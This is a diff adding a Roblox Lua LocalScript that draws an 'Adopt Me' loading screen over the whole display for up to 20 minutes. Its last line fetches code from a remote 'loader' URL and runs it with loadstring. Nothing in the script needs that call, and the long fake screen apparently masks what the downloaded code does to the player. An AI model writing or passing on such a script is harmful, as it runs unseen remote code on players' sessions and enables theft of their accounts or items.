@@ -1,0 +1,169 @@
+-- LocalScript (MUST be placed inside StarterGui)
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Create GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "CompactLoadingScreen"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.DisplayOrder = 9999  -- Make sure it's on top
+screenGui.Parent = playerGui
+
+-- Main Container
+local container = Instance.new("Frame")
+container.Name = "Container"
+container.Size = UDim2.new(0, 420, 0, 260)
+container.Position = UDim2.new(0.5, -210, 0.5, -130)
+container.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+container.BorderSizePixel = 0
+container.Parent = screenGui
+
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0, 12)
+uiCorner.Parent = container
+
+local uiStroke = Instance.new("UIStroke")
+uiStroke.Color = Color3.fromRGB(70, 70, 80)
+uiStroke.Thickness = 1.5
+uiStroke.Parent = container
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 50)
+title.BackgroundTransparency = 1
+title.Text = "Adopt Me"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBlack
+title.Parent = container
+
+-- Subtitle
+local subtitle = Instance.new("TextLabel")
+subtitle.Size = UDim2.new(1, 0, 0, 30)
+subtitle.Position = UDim2.new(0, 0, 0, 55)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = "Loading"
+subtitle.TextColor3 = Color3.fromRGB(170, 170, 180)
+subtitle.TextScaled = true
+subtitle.Font = Enum.Font.GothamMedium
+subtitle.Parent = container
+
+-- Progress Bar
+local barContainer = Instance.new("Frame")
+barContainer.Size = UDim2.new(0.85, 0, 0, 18)
+barContainer.Position = UDim2.new(0.075, 0, 0.45, 0)
+barContainer.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
+barContainer.BorderSizePixel = 0
+barContainer.Parent = container
+
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(0, 9)
+barCorner.Parent = barContainer
+
+local progressBar = Instance.new("Frame")
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+progressBar.BorderSizePixel = 0
+progressBar.Parent = barContainer
+
+local progressCorner = Instance.new("UICorner")
+progressCorner.CornerRadius = UDim.new(0, 9)
+progressCorner.Parent = progressBar
+
+-- Percentage
+local percentText = Instance.new("TextLabel")
+percentText.Size = UDim2.new(1, 0, 0, 30)
+percentText.Position = UDim2.new(0, 0, 0.62, 0)
+percentText.BackgroundTransparency = 1
+percentText.Text = "0%"
+percentText.TextColor3 = Color3.fromRGB(200, 200, 210)
+percentText.TextScaled = true
+percentText.Font = Enum.Font.GothamSemibold
+percentText.Parent = container
+
+-- Tip
+local tip = Instance.new("TextLabel")
+tip.Size = UDim2.new(0.9, 0, 0, 40)
+tip.Position = UDim2.new(0.05, 0, 0.8, 0)
+tip.BackgroundTransparency = 1
+tip.Text = "This might take a while... grab a snack ☕"
+tip.TextColor3 = Color3.fromRGB(130, 130, 140)
+tip.TextScaled = true
+tip.TextWrapped = true
+tip.Font = Enum.Font.Gotham
+tip.Parent = container
+
+local loadingComplete = false
+local TOTAL_TIME = 20 * 60 -- 20 minutes
+
+-- Dot Animation
+local function animateLoading()
+    local dots = 0
+    while not loadingComplete do
+        dots = (dots % 3) + 1
+        subtitle.Text = "Loading" .. string.rep(".", dots)
+        task.wait(0.45)
+    end
+end
+
+-- Progress
+local function startProgress()
+    local startTime = tick()
+    
+    while not loadingComplete do
+        local elapsed = tick() - startTime
+        local progress = math.min(100, (elapsed / TOTAL_TIME) * 100)
+        
+        progressBar:TweenSize(UDim2.new(progress/100, 0, 1, 0), "Out", "Linear", 0.2, true)
+        percentText.Text = math.floor(progress) .. "%"
+        
+        if progress >= 100 then
+            break
+        end
+        task.wait(0.2)
+    end
+end
+
+-- Finish Loading
+local function finishLoading()
+    if loadingComplete then return end
+    loadingComplete = true
+    subtitle.Text = "Welcome!"
+    
+    local tweenInfo = TweenInfo.new(1.2, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+    
+    TweenService:Create(container, tweenInfo, {BackgroundTransparency = 1}):Play()
+    TweenService:Create(title, tweenInfo, {TextTransparency = 1}):Play()
+    TweenService:Create(subtitle, tweenInfo, {TextTransparency = 1}):Play()
+    TweenService:Create(barContainer, tweenInfo, {BackgroundTransparency = 1}):Play()
+    TweenService:Create(progressBar, tweenInfo, {BackgroundTransparency = 1}):Play()
+    TweenService:Create(percentText, tweenInfo, {TextTransparency = 1}):Play()
+    TweenService:Create(tip, tweenInfo, {TextTransparency = 1}):Play()
+    
+    task.wait(1.8)
+    screenGui:Destroy()
+end
+
+-- Start
+coroutine.wrap(animateLoading)()
+startProgress()
+
+-- Timer
+task.spawn(function()
+    task.wait(TOTAL_TIME)
+    finishLoading()
+end)
+
+-- Safety: Auto close if game somehow finishes earlier
+game.Loaded:Connect(function()
+    task.wait(3)
+    if not loadingComplete then
+        finishLoading()
+    end
+end)
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjNlNjBmZGFkLTY5N2EtNDI4Yi04YjgzLTQ0MTBmYzVkNWQxNSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
